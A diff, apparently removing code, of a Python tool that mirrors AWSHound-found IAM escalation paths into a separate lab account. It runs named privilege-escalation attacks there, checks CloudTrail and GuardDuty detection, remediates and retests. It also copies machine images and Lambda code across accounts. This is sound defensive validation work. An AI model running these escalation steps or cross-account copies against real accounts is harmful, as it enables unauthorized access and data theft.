-                        "spot_request_id": request_id,
-                        "instance_id": instance_id,
-                        "canary_sha256": actual_hash,
-                    }
-                time.sleep(10)
-            raise PipelineError("EC2 instance did not write the evidence parameter within 10 minutes")
-        finally:
-            if request_id:
-                aws_with_profile(
-                    ["ec2", "cancel-spot-instance-requests", "--spot-instance-request-ids", request_id],
-                    target_profile,
-                    region,
-                    allow_failure=True,
-                )
-            if instance_id:
-                aws_with_profile(
-                    ["ec2", "terminate-instances", "--instance-ids", instance_id],
-                    target_profile,
-                    region,
-                    allow_failure=True,
-                )
-
-
-def execute_attack(
-    run_dir: Path,
-    target_profile: str,
-    expect_blocked: bool,
-) -> dict[str, Any]:
-    manifest = load_manifest(run_dir)
-    scenario = manifest["scenario"]
-    scenario_type = scenario["scenario_type"]
-    region = scenario["region"]
-    outputs = terraform_outputs(run_dir)
-    started = utc_now()
-    try:
-        if scenario_type == "lambda_update_invoke_admin":
-            result = attack_lambda(run_dir, outputs, region)
-        elif scenario_type == "sts_assume_admin":
-            result = attack_sts(outputs, region)
-        elif scenario_type == "iam_create_access_key_s3":
-            result = attack_create_key(outputs, region, target_profile)
-        elif scenario_type == "role_chain_s3":
-            result = attack_role_chain(outputs, region)
-        elif scenario_type == "ec2_passrole_spot_admin":
-            result = attack_ec2(outputs, region, target_profile)
-        else:
-            raise PipelineError(f"attack adapter is not implemented: {scenario_type}")
-    except PipelineError as exc:
-        if expect_blocked and is_authorization_denial(str(exc)):
-            return {
-                "status": "ATTACK_BLOCKED",
-                "proof": "The first required attack action was denied after remediation.",
-                "started_at": started,
-                "completed_at": utc_now(),
-                "denial": str(exc)[-2000:],
-            }
-        raise
-    result["started_at"] = started
-    result["completed_at"] = utc_now()
-    if expect_blocked:
-        raise PipelineError("retest failed: the attack still succeeded after remediation")
-    return result
-
-
-def remediate_mirror(run_dir: Path, profile: str, region: str) -> None:
-    terraform_available()
-    env = terraform_env(profile, region)
-    run_checked(
-        [
-            "terraform",
-            "apply",
-            "-input=false",
-            "-auto-approve",
-            "-var=enable_vulnerable_path=false",
-        ],
-        cwd=run_dir,
-        env=env,
-        timeout=1200,
-    )
-
-
-def collect_trail_data_events(
-    *,
-    bucket: str,
-    account_id: str,
-    region: str,
-    profile: str,
-    started: str,
-    event_names: list[str],
-    correlation_texts: list[str],
-) -> dict[str, Any]:
-    if not event_names:
-        return {"status": "NOT_REQUIRED", "events": []}
-    start_dt = parse_utc(started)
-    today = dt.datetime.now(dt.timezone.utc)
-    dates: list[dt.date] = []
-    cursor = start_dt.date()
-    while cursor <= today.date() and len(dates) < 3:
-        dates.append(cursor)
-        cursor += dt.timedelta(days=1)
-    objects: list[dict[str, Any]] = []
-    for day in dates:
-        prefix = f"AWSLogs/{account_id}/CloudTrail/{region}/{day:%Y/%m/%d}/"
-        code, response = aws_with_profile(
-            ["s3api", "list-objects-v2", "--bucket", bucket, "--prefix", prefix],
-            profile,
-            region,
-            allow_failure=True,
-        )
-        if code != 0:
-            return {"status": "TRAIL_LOG_QUERY_UNAVAILABLE", "events": [], "error": response}
-        objects.extend(response.get("Contents", []))
-    matching: list[dict[str, Any]] = []
-    with tempfile.TemporaryDirectory() as temporary:
-        root = Path(temporary)
-        for index, item in enumerate(sorted(objects, key=lambda value: value.get("LastModified", ""))[-100:]):
-            key = item.get("Key")
-            if not key or not key.endswith(".json.gz"):
-                continue
-            destination = root / f"trail-{index}.json.gz"
-            result = run_command(
-                [
-                    "aws",
-                    "s3api",
-                    "get-object",
-                    "--bucket",
-                    bucket,
-                    "--key",
-                    key,
-                    str(destination),
-                    "--profile",
-                    profile,
-                    "--region",
-                    region,
-                    "--no-cli-pager",
-                ],
-                timeout=120,
-            )
-            if result.returncode != 0:
-                continue
-            try:
-                with gzip.open(destination, "rt", encoding="utf-8") as stream:
-                    document = json.load(stream)
-            except (OSError, json.JSONDecodeError):
-                continue
-            for record in document.get("Records", []):
-                event_time = record.get("eventTime")
-                if not event_time:
-                    continue
-                try:
-                    if parse_utc(event_time) < start_dt:
-                        continue
-                except ValueError:
-                    continue
-                if record.get("eventName") not in event_names:
-                    continue
-                serialized = json.dumps(record, ensure_ascii=False)
-                if correlation_texts and not any(text in serialized for text in correlation_texts):
-                    continue
-                matching.append(record)
-    return {
-        "status": "COLLECTED" if matching else "NOT_FOUND_OR_NOT_YET_DELIVERED",
-        "events": matching,
-        "objects_examined": len(objects),
-    }
-
-
-def collect_detection_evidence(
-    run_dir: Path, profile: str, region: str
-) -> dict[str, Any]:
-    manifest = load_manifest(run_dir)
-    state = load_state(run_dir)
-    attack_state = state.get("attack") or state.get("retest") or {}
-    started = attack_state.get("started_at") or state.get("deployment", {}).get("started_at")
-    if not started:
-        raise PipelineError("no deployment or attack timestamp is available for evidence correlation")
-    expectations = detection_expectations_for(
-        Scenario(**manifest["scenario"])
-    )
-    outputs = terraform_outputs(run_dir)
-    management: dict[str, Any] = {}
-    for event_name in expectations["management_events"]:
-        code, response = aws_with_profile(
-            [
-                "cloudtrail",
-                "lookup-events",
-                "--lookup-attributes",
-                f"AttributeKey=EventName,AttributeValue={event_name}",
-                "--start-time",
-                started,
-                "--max-results",
-                "50",
-            ],
-            profile,
-            region,
-            allow_failure=True,
-        )
-        management[event_name] = {
-            "status": "COLLECTED" if code == 0 else "UNAVAILABLE",
-            "events": response.get("Events", []) if code == 0 else [],
-            "error": response if code != 0 else None,
-        }
-
-    guardduty: dict[str, Any] = {"status": "NOT_ENABLED", "correlated_findings": []}
-    code, detectors = aws_with_profile(
-        ["guardduty", "list-detectors"], profile, region, allow_failure=True
-    )
-    if code == 0 and detectors.get("DetectorIds"):
-        guardduty["status"] = "NO_CORRELATED_FINDING"
-        prefix = str(outputs.get("starting_user_name", ""))
-        started_ms = int(dt.datetime.fromisoformat(started).timestamp() * 1000)
-        for detector_id in detectors["DetectorIds"]:
-            _, listed = aws_with_profile(
-                [
-                    "guardduty",
-                    "list-findings",
-                    "--detector-id",
-                    detector_id,
-                    "--max-results",
-                    "50",
-                ],
-                profile,
-                region,
-                allow_failure=True,
-            )
-            ids = listed.get("FindingIds", []) if isinstance(listed, dict) else []
-            if not ids:
-                continue
-            _, found = aws_with_profile(
-                [
-                    "guardduty",
-                    "get-findings",
-                    "--detector-id",
-                    detector_id,
-                    "--finding-ids",
-                    *ids,
-                ],
-                profile,
-                region,
-                allow_failure=True,
-            )
-            for finding in found.get("Findings", []) if isinstance(found, dict) else []:
-                serialized = json.dumps(finding, ensure_ascii=False)
-                if timestamp_millis(finding.get("UpdatedAt")) >= started_ms and prefix and prefix in serialized:
-                    guardduty["correlated_findings"].append(finding)
-        if guardduty["correlated_findings"]:
-            guardduty["status"] = "DETECTED"
-
-    data_events = collect_trail_data_events(
-        bucket=str(outputs.get("cloudtrail_bucket_name", "")),
-        account_id=str(outputs.get("mirror_account_id", "")),
-        region=region,
-        profile=profile,
-        started=started,
-        event_names=list(expectations["data_events"]),
-        correlation_texts=[
-            str(outputs[name])
-            for name in (
-                "starting_user_name",
-                "access_target_user_name",
-                "target_bucket_name",
-                "target_lambda_name",
-                "s3_access_role_arn",
-            )
-            if outputs.get(name)
-        ],
-    ) if outputs.get("cloudtrail_bucket_name") else {
-        "status": "TRAIL_NOT_MANAGED_BY_MIRROR",
-        "events": [],
-    }
-    management_count = sum(len(item["events"]) for item in management.values())
-    data_count = len(data_events.get("events", []))
-    overall = "DETECTED" if guardduty["status"] == "DETECTED" else (
-        "LOGGED_ONLY" if management_count or data_count else "BLIND_OR_NOT_YET_DELIVERED"
-    )
-    return {
-        "collected_at": utc_now(),
-        "window_start": started,
-        "overall": overall,
-        "cloudtrail_management": management,
-        "cloudtrail_data_events": data_events,
-        "guardduty": guardduty,
-        "siem": {
-            "status": "CONNECTOR_REQUIRED",
-            "required_correlation_fields": [
-                "eventTime",
-                "eventName",
-                "userIdentity.arn",
-                "sourceIPAddress",
-                "awsRegion",
-                "requestParameters",
-                "responseElements",
-            ],
-        },
-    }
-
-
-def destroy_mirror(run_dir: Path, profile: str, region: str) -> None:
-    terraform_available()
-    env = terraform_env(profile, region)
-    run_checked(
-        ["terraform", "destroy", "-input=false", "-auto-approve"],
-        cwd=run_dir,
-        env=env,
-        timeout=1200,
-    )
-    artifact_manifest = run_dir / "artifact-manifest.json"
-    if artifact_manifest.is_file():
-        document = json.loads(artifact_manifest.read_text(encoding="utf-8"))
-        for item in document.get("results", []):
-            if item.get("type") == "EC2_AMI" and item.get("target_image_id"):
-                cleanup_source_image(
-                    profile,
-                    region,
-                    str(item["target_image_id"]),
-                    [str(value) for value in item.get("target_snapshots", [])],
-                )
-
-
-def load_source_subgraph(run_dir: Path) -> tuple[dict[str, Node], list[Edge]]:
-    path = run_dir / "source-subgraph.json"
-    if not path.is_file():
-        raise PipelineError(f"source subgraph is missing: {path}")
-    document = json.loads(path.read_text(encoding="utf-8"))
-    nodes = {
-        item["id"]: Node(
-            id=item["id"],
-            kinds=tuple(item.get("kinds", [])),
-            properties=dict(item.get("properties", {})),
-        )
-        for item in document.get("nodes", [])
-    }
-    edges = [
-        Edge(
-            kind=item["kind"],
-            start=item["start"],
-            end=item["end"],
-            properties=dict(item.get("properties", {})),
-        )
-        for item in document.get("edges", [])
-    ]
-    return nodes, edges
-
-
-def download_url(url: str, destination: Path) -> None:
-    destination.parent.mkdir(parents=True, exist_ok=True)
-    request = urllib.request.Request(url, headers={"User-Agent": f"mirrorctl/{VERSION}"})
-    with urllib.request.urlopen(request, timeout=120) as response, destination.open("wb") as output:
-        shutil.copyfileobj(response, output)
-
-
-def cleanup_source_image(
-    profile: str, region: str, image_id: str, snapshot_ids: list[str]
-) -> None:
-    if not snapshot_ids:
-        code, described = aws_with_profile(
-            ["ec2", "describe-images", "--image-ids", image_id],
-            profile,
-            region,
-            allow_failure=True,
-        )
-        if code == 0 and described.get("Images"):
-            snapshot_ids.extend(
-                item.get("Ebs", {}).get("SnapshotId")
-                for item in described["Images"][0].get("BlockDeviceMappings", [])
-                if item.get("Ebs", {}).get("SnapshotId")
-            )
-    aws_with_profile(
-        ["ec2", "deregister-image", "--image-id", image_id],
-        profile,
-        region,
-        allow_failure=True,
-    )
-    for snapshot_id in snapshot_ids:
-        aws_with_profile(
-            ["ec2", "delete-snapshot", "--snapshot-id", snapshot_id],
-            profile,
-            region,
-            allow_failure=True,
-        )
-
-
-def copy_ec2_artifact(
-    *,
-    node: Node,
-    source_profile: str,
-    target_profile: str,
-    target_account_id: str,
-    region: str,
-    run_prefix: str,
-) -> dict[str, Any]:
-    instance_id = str(node.properties.get("instance_id") or (node.arn or "").rsplit("/", 1)[-1])
-    image_name = re.sub(r"[^A-Za-z0-9()\[\]./_-]+", "-", f"mirrorctl-{run_prefix}-{instance_id}")[:128]
-    tag_specifications = json.dumps(
-        [
-            {
-                "ResourceType": "image",
-                "Tags": [
-                    {"Key": "ManagedBy", "Value": "awshound-mirror"},
-                    {"Key": "RunId", "Value": run_prefix},
-                ],
-            },
-            {
-                "ResourceType": "snapshot",
-                "Tags": [
-                    {"Key": "ManagedBy", "Value": "awshound-mirror"},
-                    {"Key": "RunId", "Value": run_prefix},
-                ],
-            },
-        ]
-    )
-    _, created = aws_with_profile(
-        [
-            "ec2",
-            "create-image",
-            "--instance-id",
-            instance_id,
-            "--name",
-            image_name,
-            "--description",
-            "Temporary mirrorctl artifact; crash-consistent no-reboot image",
-            "--no-reboot",
-            "--tag-specifications",
-            tag_specifications,
-        ],
-        source_profile,
-        region,
-    )
-    source_image_id = created["ImageId"]
-    snapshot_ids: list[str] = []
-    target_image_id: str | None = None
-    try:
-        wait = run_command(
-            [
-                "aws",
-                "ec2",
-                "wait",
-                "image-available",
-                "--image-ids",
-                source_image_id,
-                "--profile",
-                source_profile,
-                "--region",
-                region,
-                "--no-cli-pager",
-            ],
-            timeout=1800,
-        )
-        if wait.returncode != 0:
-            raise PipelineError(wait.stderr.strip() or "source AMI did not become available")
-        _, described = aws_with_profile(
-            ["ec2", "describe-images", "--image-ids", source_image_id],
-            source_profile,
-            region,
-        )
-        image = described["Images"][0]
-        mappings = [item.get("Ebs", {}) for item in image.get("BlockDeviceMappings", [])]
-        snapshot_ids = [item["SnapshotId"] for item in mappings if item.get("SnapshotId")]
-        if any(item.get("Encrypted") for item in mappings):
-            raise PipelineError(
-                "temporary AMI is encrypted; an approved customer-managed KMS key sharing/copy workflow is required"
-            )
-        permission = json.dumps({"Add": [{"UserId": target_account_id}]})
-        aws_with_profile(
-            [
-                "ec2",
-                "modify-image-attribute",
-                "--image-id",
-                source_image_id,
-                "--launch-permission",
-                permission,
-            ],
-            source_profile,
-            region,
-        )
-        for snapshot_id in snapshot_ids:
-            aws_with_profile(
-                [
-                    "ec2",
-                    "modify-snapshot-attribute",
-                    "--snapshot-id",
-                    snapshot_id,
-                    "--attribute",
-                    "createVolumePermission",
-                    "--operation-type",
-                    "add",
-                    "--user-ids",
-                    target_account_id,
-                ],
-                source_profile,
-                region,
-            )
-        _, copied = aws_with_profile(
-            [
-                "ec2",
-                "copy-image",
-                "--source-region",
-                region,
-                "--source-image-id",
-                source_image_id,
-                "--name",
-                image_name,
-                "--description",
-                "Target-account copy created by mirrorctl",
-                "--copy-image-tags",
-            ],
-            target_profile,
-            region,
-        )
-        target_image_id = copied["ImageId"]
-        target_wait = run_command(
-            [
-                "aws",
-                "ec2",
-                "wait",
-                "image-available",
-                "--image-ids",
-                target_image_id,
-                "--profile",
-                target_profile,
-                "--region",
-                region,
-                "--no-cli-pager",
-            ],
-            timeout=1800,
-        )
-        if target_wait.returncode != 0:
-            raise PipelineError(target_wait.stderr.strip() or "target AMI copy did not become available")
-        _, target_described = aws_with_profile(
-            ["ec2", "describe-images", "--image-ids", target_image_id],
-            target_profile,
-            region,
-        )
-        target_snapshot_ids = [
-            item.get("Ebs", {}).get("SnapshotId")
-            for item in target_described.get("Images", [{}])[0].get("BlockDeviceMappings", [])
-            if item.get("Ebs", {}).get("SnapshotId")
-        ]
-        return {
-            "status": "COPIED",
-            "instance_id": instance_id,
-            "source_temporary_image_id": source_image_id,
-            "target_image_id": target_image_id,
-            "target_snapshots": target_snapshot_ids,
-            "source_snapshots": snapshot_ids,
-            "consistency": "CRASH_CONSISTENT_NO_REBOOT",
-        }
-    finally:
-        # Once the target copy is available, or when copying fails, remove only
-        # the temporary source artifacts created by this function.
-        cleanup_source_image(source_profile, region, source_image_id, snapshot_ids)
-
-
-def collect_approved_artifacts(
-    *,
-    run_dir: Path,
-    source_profile: str,
-    target_profile: str,
-    expected_target_account_id: str,
-    include_ec2_snapshots: bool,
-) -> dict[str, Any]:
-    manifest = load_manifest(run_dir)
-    scenario = manifest["scenario"]
-    region = scenario["region"]
-    source_identity = aws_identity(source_profile, region)
-    if str(source_identity.get("Account")) != str(scenario.get("source_account_id")):
-        raise PipelineError(
-            f"source profile account mismatch: graph={scenario.get('source_account_id')}, profile={source_identity.get('Account')}"
-        )
-    target_identity = aws_identity(target_profile, region)
-    if str(target_identity.get("Account")) != expected_target_account_id:
-        raise PipelineError(
-            f"target profile account mismatch: expected={expected_target_account_id}, profile={target_identity.get('Account')}"
-        )
-    if source_identity["Account"] == target_identity["Account"]:
-        raise PipelineError("artifact source and target accounts must be different")
-    nodes, _ = load_source_subgraph(run_dir)
-    artifact_root = run_dir / "artifacts"
-    artifact_root.mkdir(parents=True, exist_ok=True)
-    results: list[dict[str, Any]] = []
-    tfvars: dict[str, dict[str, str]] = {
-        "lambda_package_files": {},
-        "ec2_ami_overrides": {},
-    }
-    for node in nodes.values():
-        address = tf_address(node)
-        if node.primary_kind == "AWS_LambdaFunction":
-            code, response = aws_with_profile(
-                ["lambda", "get-function", "--function-name", node.arn or node_name(node)],
-                source_profile,
-                region,
-                allow_failure=True,
-            )
-            if code != 0:
-                results.append({"node_id": node.id, "type": "LAMBDA", "status": "UNAVAILABLE", "error": response})
-                continue
-            location = response.get("Code", {}).get("Location")
-            image_uri = response.get("Code", {}).get("ResolvedImageUri") or response.get("Code", {}).get("ImageUri")
-            if location:
-                destination = (artifact_root / f"{address}.zip").resolve()
-                download_url(location, destination)
-                tfvars["lambda_package_files"][address] = str(destination)
-                results.append({"node_id": node.id, "type": "LAMBDA_ZIP", "status": "COPIED", "path": str(destination), "sha256": sha256_bytes(destination.read_bytes())})
-            elif image_uri:
-                results.append({"node_id": node.id, "type": "LAMBDA_CONTAINER", "status": "CONTAINER_COPY_REQUIRED", "image_uri": image_uri})
-            else:
-                results.append({"node_id": node.id, "type": "LAMBDA", "status": "UNAVAILABLE", "error": response.get("Code", {}).get("Error")})
-        elif node.primary_kind == "AWS_CloudFormationStack":
-            code, response = aws_with_profile(
-                ["cloudformation", "get-template", "--stack-name", node.arn or node_name(node), "--template-stage", "Original"],
-                source_profile,
-                region,
-                allow_failure=True,
-            )
-            if code == 0:
-                destination = artifact_root / f"{address}.template"
-                destination.write_text(str(response.get("TemplateBody", "")), encoding="utf-8")
-                results.append({"node_id": node.id, "type": "CLOUDFORMATION_TEMPLATE", "status": "COLLECTED_REVIEW_REQUIRED", "path": str(destination), "sha256": sha256_bytes(destination.read_bytes())})
-            else:
-                results.append({"node_id": node.id, "type": "CLOUDFORMATION_TEMPLATE", "status": "UNAVAILABLE", "error": response})
-        elif node.primary_kind == "AWS_EC2Instance":
-            if not include_ec2_snapshots:
-                results.append({"node_id": node.id, "type": "EC2_AMI", "status": "SNAPSHOT_APPROVAL_REQUIRED"})
-                continue
-            copied = copy_ec2_artifact(
-                node=node,
-                source_profile=source_profile,
-                target_profile=target_profile,
-                target_account_id=expected_target_account_id,
-                region=region,
-                run_prefix=scenario["scenario_id"],
-            )
-            tfvars["ec2_ami_overrides"][address] = copied["target_image_id"]
-            results.append({"node_id": node.id, "type": "EC2_AMI", **copied})
-    tfvars = {key: value for key, value in tfvars.items() if value}
-    if scenario["scenario_type"] == "generic_awshound_path" and tfvars:
-        write_json(run_dir / "artifact.auto.tfvars.json", tfvars)
-    result = {
-        "collected_at": utc_now(),
-        "source_account_id": source_identity["Account"],
-        "target_account_id": target_identity["Account"],
-        "include_ec2_snapshots": include_ec2_snapshots,
-        "results": results,
-        "terraform_values_written": tfvars if scenario["scenario_type"] == "generic_awshound_path" else {},
-    }
-    write_json(run_dir / "artifact-manifest.json", result)
-    return result
-
-
-def ensure_empty_or_force(destination: Path, force: bool) -> None:
-    if not destination.exists():
-        destination.mkdir(parents=True, exist_ok=True)
-        return
-    if any(destination.iterdir()):
-        if not force:
-            raise PipelineError(
-                f"output directory is not empty: {destination} (use --force to replace generated scenario directories)"
-            )
-        resolved = destination.resolve()
-        if resolved == Path(resolved.anchor):
-            raise PipelineError("refusing to replace a filesystem root")
-        # Remove only known generated scenario directories and top-level reports.
-        for child in destination.iterdir():
-            if child.is_dir() and (child / "run-manifest.json").is_file():
-                shutil.rmtree(child)
-            elif (
-                child.name in {"analysis.json", "pipeline-summary.json", "index.json"}
-                or re.fullmatch(r"path-\d{3}\.(?:json|zip)", child.name)
-            ) and child.is_file():
-                child.unlink()
-            else:
-                raise PipelineError(
-                    f"refusing --force because output contains an unknown item: {child}"
-                )
-    destination.mkdir(parents=True, exist_ok=True)
-
-
-def analyze_document(input_path: Path) -> tuple[
-    dict[str, Any], bytes, dict[str, Node], list[Edge], list[Scenario]
-]:
-    document, raw = load_graph(input_path)
-    nodes, edges = normalize_graph(document)
-    scenarios = detect_scenarios(nodes, edges)
-    return document, raw, nodes, edges, scenarios
-
-
-def cmd_analyze(args: argparse.Namespace) -> None:
-    _, raw, nodes, edges, scenarios = analyze_document(args.input)
-    catalog = official_edge_catalog()
-    report = {
-        "tool": "mirrorctl",
-        "tool_version": VERSION,
-        "analyzed_at": utc_now(),
-        "source": source_summary(nodes, edges, raw),
-        "scenarios": [asdict(scenario) for scenario in scenarios],
-        "unsupported": {
-            "node_kinds": sorted(
-                {node.primary_kind for node in nodes.values() if node.primary_kind not in NODE_LAYERS}
-            ),
-            "edge_kinds": sorted(
-                {edge.kind for edge in edges if edge.kind not in catalog}
-            ),
-        },
-        "registry_coverage": {
-            "official_node_kinds": 20,
-            "official_relationship_kinds": len(catalog),
-            "structural_relationship_kinds": sum(1 for item in catalog.values() if item["structural"]),
-            "action_mapped_relationship_kinds": sum(1 for item in catalog.values() if not item["structural"] and item["actions"]),
-        },
-    }
-    if args.output:
-        write_json(args.output, report)
-        print(f"Analysis written to {args.output}")
-    else:
-        print(json.dumps(report, indent=2, ensure_ascii=False))
-
-
-def cmd_extract(args: argparse.Namespace) -> None:
-    _, raw, nodes, edges, _ = analyze_document(args.input)
-    paths = extract_attack_paths(
-        nodes,
-        edges,
-        source_selectors=args.source,
-        target_selectors=args.target,
-        max_depth=args.max_depth,
-        limit=args.limit,
-    )
-    if not paths:
-        raise PipelineError("no traversable source-to-target attack path was found")
-    result = write_extracted_paths(
-        args.output,
-        paths,
-        nodes,
-        sha256_bytes(raw),
-        args.force,
-    )
-    print(f"Extracted {result['path_count']} attack path(s) to {args.output}")
-    for item in result["paths"]:
-        print(
-            f"  - {item['path_id']}: {item['source_name']} -> "
-            f"{item['target_name']} (depth={item['depth']}, score={item['score']})"
-        )
-
-
-def cmd_prepare(args: argparse.Namespace) -> None:
-    _, raw, nodes, edges, scenarios = analyze_document(args.input)
-    if args.scenario:
-        wanted = set(args.scenario)
-        scenarios = [scenario for scenario in scenarios if scenario.scenario_id in wanted]
-        missing = wanted - {scenario.scenario_id for scenario in scenarios}
-        if missing:
-            raise PipelineError("requested scenario was not detected: " + ", ".join(sorted(missing)))
-    if not scenarios:
-        raise PipelineError("no supported attack-path scenario was detected")
-    ensure_empty_or_force(args.output, args.force)
-    summary = {
-        "tool": "mirrorctl",
-        "tool_version": VERSION,
-        "prepared_at": utc_now(),
-        "source_file": str(args.input),
-        "source": source_summary(nodes, edges, raw),
-        "scenario_directories": [],
-    }
-    for scenario in scenarios:
-        requests = context_plan(scenario, nodes, edges)
-        collected = (
-            collect_context(requests, args.source_profile, scenario.source_account_id)
-            if args.source_profile
-            else None
-        )
-        destination = generate_scenario_directory(
-            args.output,
-            scenario,
-            nodes,
-            edges,
-            requests,
-            sha256_bytes(raw),
-            collected,
-        )
-        if collected is not None:
-            write_json(destination / "context-evidence.json", collected)
-        summary["scenario_directories"].append(
-            {
-                "scenario_id": scenario.scenario_id,
-                "scenario_type": scenario.scenario_type,
-                "path": str(destination),
-                "context_collected": bool(args.source_profile),
-            }
-        )
-    write_json(args.output / "pipeline-summary.json", summary)
-    print(f"Prepared {len(scenarios)} scenario(s) in {args.output}")
-    for item in summary["scenario_directories"]:
-        print(f"  - {item['scenario_id']}: {item['path']}")
-    print("No Terraform or attack command was executed.")
-
-
-def require_deployed(run_dir: Path) -> None:
-    state = load_state(run_dir)
-    if state.get("deployment", {}).get("status") != "DEPLOYED":
-        raise PipelineError("mirror is not recorded as DEPLOYED")
-
-
-def operational_context(args: argparse.Namespace) -> tuple[dict[str, Any], str]:
-    run_dir = args.run_dir.resolve()
-    manifest = load_manifest(run_dir)
-    verify_target(
-        run_dir,
-        args.target_profile,
-        args.expected_account_id,
-        args.allow_source_account,
-    )
-    return manifest, manifest["scenario"]["region"]
-
-
-def cmd_deploy(args: argparse.Namespace) -> None:
-    approval(args.approve, "APPLY")
-    deploy_mirror(
-        args.run_dir.resolve(),
-        args.target_profile,
-        args.expected_account_id,
-        args.allow_source_account,
-    )
-    print("Mirror deployed. Attack execution has not started.")
-
-
-def cmd_attack(args: argparse.Namespace) -> None:
-    approval(args.approve, "ATTACK")
-    run_dir = args.run_dir.resolve()
-    operational_context(args)
-    require_deployed(run_dir)
-    contract_path = run_dir / "validation-contract.json"
-    if contract_path.is_file():
-        contract = json.loads(contract_path.read_text(encoding="utf-8"))
-        if contract.get("automation_status") != "AUTO_EXECUTABLE":
-            details = {
-                "missing_automation": contract.get("missing_automation", []),
-                "validation_contract": str(contract_path),
-            }
-            append_history(
-                run_dir,
-                "attack",
-                "EXECUTOR_IMPLEMENTATION_REQUIRED",
-                details,
-            )
-            raise PipelineError(
-                "attack execution is not implemented for this path; see validation-contract.json"
-            )
-    try:
-        result = execute_attack(run_dir, args.target_profile, expect_blocked=False)
-        write_json(run_dir / ".mirrorctl" / "attack-result.json", result)
-        append_history(run_dir, "attack", result["status"], result)
-    except PipelineError as exc:
-        status = "BLOCKED" if is_authorization_denial(str(exc)) else "ERROR"
-        details = {"started_at": utc_now(), "completed_at": utc_now(), "error": str(exc)[-2000:]}
-        append_history(run_dir, "attack", status, details)
-        raise
-    print(f"Attack validation: {result['status']}")
-
-
-def cmd_evidence(args: argparse.Namespace) -> None:
-    run_dir = args.run_dir.resolve()
-    _, region = operational_context(args)
-    require_deployed(run_dir)
-    result = collect_detection_evidence(run_dir, args.target_profile, region)
-    destination = run_dir / ".mirrorctl" / "detection-evidence.json"
-    write_json(destination, result)
-    append_history(run_dir, "evidence", result["overall"], {"evidence_file": str(destination)})
-    print(f"Detection validation: {result['overall']}")
-    print(f"Evidence written to {destination}")
-
-
-def cmd_remediate(args: argparse.Namespace) -> None:
-    approval(args.approve, "FIX")
-    run_dir = args.run_dir.resolve()
-    _, region = operational_context(args)
-    require_deployed(run_dir)
-    remediate_mirror(run_dir, args.target_profile, region)
-    append_history(
-        run_dir,
-        "remediation",
-        "APPLIED",
-        {"control": "enable_vulnerable_path=false", "completed_at": utc_now()},
-    )
-    print("Remediation applied. Run retest to prove the path is blocked.")
-
-
-def cmd_retest(args: argparse.Namespace) -> None:
-    approval(args.approve, "RETEST")
-    run_dir = args.run_dir.resolve()
-    operational_context(args)
-    require_deployed(run_dir)
-    state = load_state(run_dir)
-    if state.get("remediation", {}).get("status") != "APPLIED":
-        raise PipelineError("remediation is not recorded as APPLIED")
-    # IAM and resource-policy changes are eventually consistent.
-    time.sleep(10)
-    result = execute_attack(run_dir, args.target_profile, expect_blocked=True)
-    write_json(run_dir / ".mirrorctl" / "retest-result.json", result)
-    append_history(run_dir, "retest", result["status"], result)
-    print(f"Retest: {result['status']}")
-
-
-def cmd_destroy(args: argparse.Namespace) -> None:
-    approval(args.approve, "DESTROY")
-    run_dir = args.run_dir.resolve()
-    _, region = operational_context(args)
-    destroy_mirror(run_dir, args.target_profile, region)
-    append_history(run_dir, "destroy", "DESTROYED", {"completed_at": utc_now()})
-    print("Mirror resources destroyed. Local evidence and Terraform state were retained.")
-
-
-def cmd_artifacts(args: argparse.Namespace) -> None:
-    approval(args.approve, "ARTIFACTS")
-    run_dir = args.run_dir.resolve()
-    result = collect_approved_artifacts(
-        run_dir=run_dir,
-        source_profile=args.source_profile,
-        target_profile=args.target_profile,
-        expected_target_account_id=args.expected_target_account_id,
-        include_ec2_snapshots=args.include_ec2_snapshots,
-    )
-    copied = sum(1 for item in result["results"] if item.get("status") in {"COPIED", "COLLECTED_REVIEW_REQUIRED"})
-    append_history(
-        run_dir,
-        "artifacts",
-        "COLLECTED" if copied else "NO_ARTIFACT_COPIED",
-        {"artifact_manifest": str(run_dir / "artifact-manifest.json"), "copied": copied},
-    )
-    print(f"Artifact collection completed: {copied} copied/collected")
-    print(f"Manifest: {run_dir / 'artifact-manifest.json'}")
-
-
-def add_operational_arguments(parser: argparse.ArgumentParser, approval_token: str | None) -> None:
-    parser.add_argument("--run-dir", required=True, type=Path, help="generated scenario directory")
-    parser.add_argument("--target-profile", required=True, help="AWS CLI profile for the mirror account")
-    parser.add_argument("--expected-account-id", required=True, help="exact 12-digit mirror account ID")
-    parser.add_argument(
-        "--allow-source-account",
-        action="store_true",
-        help="allow the graph source account only when it is an explicitly authorized disposable lab",
-    )
-    if approval_token:
-        parser.add_argument(
-            "--approve",
-            required=True,
-            help=f"exact confirmation token: {approval_token}",
-        )
-
-
-def build_parser() -> argparse.ArgumentParser:
-    parser = argparse.ArgumentParser(
-        description="Analyze AWSHound paths and orchestrate isolated minimal mirrors."
-    )
-    parser.add_argument("--version", action="version", version=f"mirrorctl {VERSION}")
-    subparsers = parser.add_subparsers(dest="command", required=True)
-
-    analyze = subparsers.add_parser("analyze", help="classify paths and layers; no AWS access")
-    analyze.add_argument("--input", required=True, type=Path, help="AWSHound graph ZIP or graph.json")
-    analyze.add_argument("--output", type=Path, help="optional analysis JSON path")
-    analyze.set_defaults(func=cmd_analyze)
-
-    extract = subparsers.add_parser(
-        "extract",
-        help="extract ranked traversable source-to-target paths from a full AWSHound graph",
-    )
-    extract.add_argument("--input", required=True, type=Path, help="full AWSHound graph ZIP or graph.json")
-    extract.add_argument("--output", required=True, type=Path, help="directory for path JSON/ZIP files")
-    extract.add_argument(
-        "--source",
-        action="append",
-        help="source node ID, ARN, name, or substring; repeatable; defaults to starting-tagged principals",
-    )
-    extract.add_argument(
-        "--target",
-        action="append",
-        help="target node ID, ARN, name, or substring; repeatable; defaults to admin/data targets",
-    )
-    extract.add_argument("--max-depth", type=int, default=6, help="maximum traversable edges per path (1-12)")
-    extract.add_argument("--limit", type=int, default=20, help="maximum ranked paths to export (1-500)")
-    extract.add_argument("--force", action="store_true", help="replace only recognized extracted-path files")
-    extract.set_defaults(func=cmd_extract)
-
-    prepare = subparsers.add_parser(
-        "prepare",
-        help="create context plans, minimal specs and Terraform; optionally collect read-only context",
-    )
-    prepare.add_argument("--input", required=True, type=Path, help="AWSHound graph ZIP or graph.json")
-    prepare.add_argument("--output", required=True, type=Path, help="generated pipeline directory")
-    prepare.add_argument(
-        "--scenario",
-        action="append",
-        help="scenario ID to prepare; repeat to select multiple; default is all detected scenarios",
-    )
-    prepare.add_argument(
-        "--source-profile",
-        help="optional source profile for allow-listed read-only context collection",
-    )
-    prepare.add_argument("--force", action="store_true", help="replace only recognized generated output")
-    prepare.set_defaults(func=cmd_prepare)
-
